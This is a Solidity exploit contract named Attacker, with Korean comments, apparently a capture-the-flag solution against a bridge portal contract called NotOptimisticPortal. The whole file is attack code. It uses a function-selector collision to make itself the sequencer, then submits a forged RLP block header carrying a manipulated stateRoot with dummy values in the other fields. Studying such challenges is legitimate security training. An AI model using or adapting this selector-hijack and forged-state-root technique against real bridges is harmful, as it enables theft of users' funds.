// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {INotOptimisticPortal} from "src/INotOptimisticPortal.sol";
import {RLP} from "src/RLP.sol";

contract Attacker {

    INotOptimisticPortal immutable target;
    bytes32 stateRoot;

    constructor(INotOptimisticPortal _target) {
        target = _target;
    }

    function setStateRoot(bytes32 _stateRoot) public {
        stateRoot = _stateRoot;
    }

    // 시그니처가 0x3a69197e로 동일
    function onMessageReceived(bytes memory messageData) public {
        messageData;
        target.updateSequencer_____76439298743(address(this));

        bytes memory rlpBlockHeader = _encodeRlpBlockHeader();
        target.submitNewBlock_____37278985983(rlpBlockHeader);
    }

    /// @notice stateRoot 필드 하나만 실제 값을 반영하고 나머지는 전부 더미로 채운
    ///         RLP 인코딩 블록 헤더 (post-London 기준 16개 필드).
    ///         필드 순서는 go-ethereum core/types.Header와 동일:
    ///         parentHash, ommersHash, beneficiary, stateRoot, transactionsRoot,
    ///         receiptsRoot, logsBloom, difficulty, number, gasLimit, gasUsed,
    ///         timestamp, extraData, mixHash, nonce, baseFeePerGas.
    /// @dev submitNewBlock_____37278985983가 헤더 해시 전체를 신뢰 가능한 값과
    ///      대조하지 않는다는 전제(단서2)하에, stateRoot 외 필드는 값이 무엇이든
    ///      상관없다고 가정한다. 대상 체인이 Shanghai/Cancun 이후 포크라
    ///      withdrawalsRoot 등 추가 필드까지 요구한다면 리스트 뒤에 더미 필드를
    ///      이어붙이면 된다.
    function _encodeRlpBlockHeader() internal view returns (bytes memory) {
        bytes[] memory fields = new bytes[](16);

        fields[0]  = RLP.encodeBytes(abi.encodePacked(target.latestBlockHash()));  // 요구사항에 맞는 parentHash
        fields[1]  = RLP.encodeBytes(abi.encodePacked(bytes32(0)));  // ommersHash (더미)
        fields[2]  = RLP.encodeBytes(abi.encodePacked(address(0)));  // beneficiary/coinbase (더미)
        fields[3]  = RLP.encodeBytes(abi.encodePacked(stateRoot));   // 조작된 stateRoot
        fields[4]  = RLP.encodeBytes(abi.encodePacked(bytes32(0)));  // transactionsRoot (더미)
        fields[5]  = RLP.encodeBytes(abi.encodePacked(bytes32(0)));  // receiptsRoot (더미)
        fields[6]  = RLP.encodeBytes(new bytes(256));                // logsBloom, 256바이트 고정 (더미)
        fields[7]  = RLP.encodeUint(0);                              // difficulty (더미, PoS L2라 0이 자연스러움)
        fields[8]  = RLP.encodeUint(target.latestBlockNumber() + 1); // 요구사항에 맞는 block number
        fields[9]  = RLP.encodeUint(0);                              // gasLimit (더미)
        fields[10] = RLP.encodeUint(0);                              // gasUsed (더미)
        fields[11] = RLP.encodeUint(target.latestBlockTimestamp() + 1);                              // 요구사항에 맞는 timestamp
        fields[12] = RLP.encodeBytes(new bytes(0));                  // extraData (더미, 빈 값)
        fields[13] = RLP.encodeBytes(abi.encodePacked(bytes32(0)));  // mixHash (더미)
        fields[14] = RLP.encodeBytes(new bytes(8));                  // nonce, 8바이트 고정 (더미)
        fields[15] = RLP.encodeUint(0);                              // baseFeePerGas (더미)

        return RLP.encodeList(fields);
    }
}
